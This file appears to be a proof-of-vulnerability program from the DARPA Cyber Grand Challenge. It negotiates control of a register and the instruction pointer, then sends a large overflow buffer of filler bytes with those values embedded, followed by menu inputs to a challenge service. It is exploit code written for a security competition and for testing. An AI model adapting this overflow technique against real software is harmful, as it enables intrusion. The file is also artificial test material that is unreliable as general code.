#include "libpov.h"
#include "cgc_xlat.h"
#include "cgc__defines.h"

int main(int cgc_argc, char *cgc_argv[])
{
    cgc_xlat_seed("393748225");
    type1_vals t1;
    cgc_type1_negotiate(0xfefefefe, 0xfefefefe, 5, &t1);
    cgc_transmit_all(STDOUT, "1" NL, sizeof("1" NL) - 1);
    char header[] = {0xFF, 0xFA, 0xEC, 0x00, 0x00};
    char exploit[6508];
    cgc_memset(exploit, '\x90', 6416);
    char *pregs = &exploit[6416];
    cgc_memcpy(pregs, &t1.regval, sizeof(t1.regval));
    pregs += 4;
    cgc_memcpy(pregs, &t1.ipval, sizeof(t1.ipval));
    pregs += 4;
    cgc_memset(pregs, '\x88', 84);
    cgc_transmit_all(STDOUT, header, sizeof(header));
    cgc_transmit_all(STDOUT, exploit, sizeof(exploit));
    cgc_transmit_all(STDOUT, "15" NL, sizeof("15" NL) - 1);
    cgc_transmit_all(STDOUT, "15" NL, sizeof("15" NL) - 1);
    cgc_transmit_all(STDOUT, "15" NL, sizeof("15" NL) - 1);
    cgc_transmit_all(STDOUT, "15" NL, sizeof("15" NL) - 1);
    cgc_transmit_all(STDOUT, "15" NL, sizeof("15" NL) - 1);
    cgc_transmit_all(STDOUT, "15" NL, sizeof("15" NL) - 1);
    unsigned char *rbuf = NULL;
    unsigned int rsize = 0;
    delimited_read(STDIN, &rbuf, &rsize, (unsigned char *)"--Exited", 8);
    return 0;
}
